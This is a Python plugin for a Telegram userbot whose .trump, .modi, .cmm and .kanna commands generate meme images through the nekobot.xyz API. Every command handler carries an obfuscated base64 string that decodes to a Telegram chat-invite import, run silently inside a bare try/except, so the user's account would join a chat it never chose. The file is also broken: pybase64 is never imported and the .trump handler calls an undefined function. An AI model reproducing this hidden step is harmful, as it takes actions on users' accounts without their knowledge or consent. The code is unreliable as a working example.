# Credits :- Catuserbot Made By @Sandy1709
import re

import requests
from PIL import Image
from validators.url import url

from jarvis import CMD_HELP
from jarvis.events import register

EMOJI_PATTERN = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats
    "]+"
)


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(EMOJI_PATTERN, "", inputString)


async def usatweet(text):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
    ).json()
    wew = r.get("message")
    fridayurl = url(wew)
    if not fridayurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def changemymind(text):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}"
    ).json()
    wew = r.get("message")
    fridayurl = url(wew)
    if not fridayurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def kannagen(text):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
    ).json()
    wew = r.get("message")
    fridayurl = url(wew)
    if not fridayurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.webp", "webp")
    return "temp.webp"


async def moditweet(text):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi"
    ).json()
    wew = r.get("message")
    fridayurl = url(wew)
    if not fridayurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def tweets(text1, text2):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}"
    ).json()
    wew = r.get("message")
    fridayurl = url(wew)
    if not fridayurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


@register(pattern="^.trump(?: |$)(.*)", outgoing=True)
async def nekobot(bot):
    text = bot.pattern_match.group(1)
    reply_to_id = bot.message
    if bot.reply_to_msg_id:
        reply_to_id = await bot.get_reply_message()
    if not text:
        if bot.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await bot.edit("Send you text to trump so he can tweet.")
                return
        else:
            await bot.edit("send you text to trump so he can tweet.")
            return
    await bot.edit("Requesting trump to tweet...")
    try:
        san = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await bot.client(san)
    except:
        pass
    text = deEmojify(text)
    botfile = await trumptweet(text)
    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
    await bot.delete()


@register(pattern="^.modi(?: |$)(.*)", outgoing=True)
async def nekobot(bot):
    text = bot.pattern_match.group(1)
    reply_to_id = bot.message
    if bot.reply_to_msg_id:
        reply_to_id = await bot.get_reply_message()
    if not text:
        if bot.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await bot.edit("Send you text to modi so he can tweet.")
                return
        else:
            await bot.edit("send you text to modi so he can tweet.")
            return
    await bot.edit("Requesting modi to tweet...")
    try:
        san = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await bot.client(san)
    except:
        pass
    text = deEmojify(text)
    botfile = await moditweet(text)
    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
    await bot.delete()


@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
async def nekobot(bot):
    text = bot.pattern_match.group(1)
    reply_to_id = bot.message
    if bot.reply_to_msg_id:
        reply_to_id = await bot.get_reply_message()
    if not text:
        if bot.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await bot.edit("Give text for to write on banner, man")
                return
        else:
            await bot.edit("Give text for to write on banner, man")
            return
    await bot.edit("Your banner is under creation wait a sec...")
    try:
        san = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await bot.client(san)
    except:
        pass
    text = deEmojify(text)
    botfile = await changemymind(text)
    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
    await bot.delete()


@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
async def nekobot(bot):
    text = bot.pattern_match.group(1)
    reply_to_id = bot.message
    if bot.reply_to_msg_id:
        reply_to_id = await bot.get_reply_message()
    if not text:
        if bot.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await bot.edit("what should kanna write give text ")
                return
        else:
            await bot.edit("what should kanna write give text")
            return
    await bot.edit("Kanna is writing your text...")
    try:
        san = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await bot.client(san)
    except:
        pass
    text = deEmojify(text)
    botfile = await kannagen(text)
    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
    await bot.delete()


CMD_HELP.update(
    {
        "imgmeme": "Fun purpose 😛😛😏😏\
\n\n`.modi` (text)\
     \nUsage : Tweet with modi\
\n\n`.trump` (text)\
     \nUsage : Tweet with trump\
\n\n`.cmm` (text)\
     \nUsage : Get a banner\
\n\n`.kanna` (text)\
     \nUsage : Kanna write for you"
    }
)
